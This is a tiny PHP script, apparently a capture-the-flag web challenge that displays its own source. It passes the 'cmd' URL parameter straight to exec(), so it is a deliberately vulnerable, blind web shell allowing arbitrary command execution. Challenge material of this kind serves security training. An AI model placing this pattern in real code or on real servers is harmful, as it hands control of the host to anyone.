<?php
if(isset($_GET['cmd'])){
    exec($_GET['cmd']);
}
highlight_file(__FILE__);